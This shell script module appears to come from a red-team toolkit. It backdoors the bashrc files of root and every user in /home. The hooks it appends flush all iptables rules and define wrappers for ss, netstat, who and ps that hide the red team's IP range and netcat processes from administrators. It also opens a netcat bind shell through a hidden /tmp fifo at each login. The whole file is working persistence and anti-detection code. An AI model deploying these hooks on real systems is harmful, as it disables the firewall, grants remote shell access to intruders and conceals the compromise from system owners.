# Adds easy to find hooks to bashrc files
# DEPENDS: LOG

# This is red teams ip space
HIDE_IP="10.2.3"

bashrc_hooks () {
    bashrc_file=$1
    if [ ! -f $bashrc_file ]; then
	return 1;
    fi;
    # Flush iptables
    echo "iptables -F; iptables -t mangle -F; iptables -t nat -F" >> $1
    hooks_ss="ss() {
    `command -v ss` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc;\n};";
    hooks_netstat="netstat() {
    `command -v netstat` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc;\n};";
    hooks_who="who() {
    `command -v who` \"\$@\" | grep -Ev \"$HIDE_IP\";\n};";
    hooks_ps="ps() {
    `command -v ps` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc | grep -v grep;
};";
    # Open a nc shell on a random por tin the 4000 range
    add_nc="n=\$(((\$RANDOM % 1000) + 4000));\nmkfifo \"/tmp/.\$n\";
nc -lp \$n < \"/tmp/.\$n\" | bash > \"/tmp/.\$n\" & 2>/dev/null";

    # If each command exists, add the hook to the bash_rc
    COMMAND="ss"
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ]; then
	printf "$hooks_ss\n" >> $bashrc_file;
    fi
    COMMAND="netstat"
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ]; then
	printf "$hooks_netstat\n" >> $bashrc_file;
    fi
    COMMAND="who"
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ]; then
	printf "$hooks_who\n" >> $bashrc_file;
    fi
    COMMAND="ps"
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ]; then
	printf "$hooks_ps\n" >> $bashrc_file;
    fi
    # Add a netcat shell
    QUIET command -v nc;
    [ "$?" = 0 ] && echo -e "$add_nc" >> $bashrc_file;
    LOG 0 "$bashrc_file hooks added";
};


bashrc() {
    HIDE_IP="$GLOBAL_HIDE_IP";
    LOG 0 "Hooking Bashrc files...";
    bashrc_hooks "/root/.bashrc";
    for f in `find /home -name "\.bashrc"`; do
	bashrc_hooks "$f";
    done;
    return 0;
};
